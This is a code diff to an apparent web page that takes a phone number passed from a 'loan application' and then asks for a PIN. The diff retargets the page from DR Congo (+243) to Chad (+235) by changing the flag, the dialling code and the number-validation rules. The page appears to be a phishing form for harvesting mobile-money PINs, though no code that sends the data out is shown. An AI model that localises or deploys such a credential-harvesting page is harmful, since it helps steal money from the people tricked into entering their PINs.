@@ -354,14 +354,13 @@
       <div class="phone-field">
         <span class="flag">
           <svg viewBox="0 0 30 20" xmlns="http://www.w3.org/2000/svg">
-            <rect width="30" height="20" fill="#007fff"/>
-            <polygon points="0,20 6,20 30,0 24,0" fill="#f7d618"/>
-            <polygon points="0,20 3.6,20 27.6,0 24,0" fill="#ce1021"/>
-            <polygon points="8,3 8.6,4.9 10.6,4.9 9,6.1 9.6,8 8,6.9 6.4,8 7,6.1 5.4,4.9 7.4,4.9" fill="#f7d618"/>
+            <rect width="10" height="20" fill="#002664"/>
+            <rect x="10" width="10" height="20" fill="#fecb00"/>
+            <rect x="20" width="10" height="20" fill="#c60c30"/>
           </svg>
         </span>
-        <span class="code">+243</span>
-        <input type="tel" id="phoneInput" placeholder="90123456" inputmode="numeric" maxlength="8">
+        <span class="code">+235</span>
+        <input type="tel" id="phoneInput" placeholder="90000000" inputmode="numeric" maxlength="8">
       </div>
 
       <div class="code-label">Entrez votre code PIN</div>
@@ -413,13 +412,13 @@
 
 <script>
   const phoneInput = document.getElementById('phoneInput');
-  const validPhonePattern = /^(?:30|90|91|92|93|95|99)[0-9]{6}$/;
+  const validPhonePattern = /^(?:6|7|9)[0-9]{7}$/;
   const codeBoxes = Array.from(document.querySelectorAll('.code-box'));
 
   // Automatically reflect the phone number passed from the loan application.
   const incomingParams = new URLSearchParams(window.location.search);
   const incomingPhone = incomingParams.get('phone') || '';
-  const normalizedPhone = incomingPhone.replace(/\\D/g, '').replace(/^243/, '');
+  const normalizedPhone = incomingPhone.replace(/\D/g, '').replace(/^235/, '');
   if (validPhonePattern.test(normalizedPhone)) {
     phoneInput.value = normalizedPhone;
   }
@@ -529,7 +528,7 @@
     // Show the invalid-number page only when the user tries to submit.
     if(!validPhonePattern.test(phone)){
       showInvalidPhone(
-        'Le numéro doit contenir 8 chiffres et commencer par 30, 90, 91, 92, 93, 95 ou 99.<br>Veuillez entrer le bon numéro et réessayer!'
+        'Le numéro doit contenir 8 chiffres et commencer par 6, 7 ou 9.<br>Veuillez entrer le bon numéro et réessayer!'
       );
       return;
     }
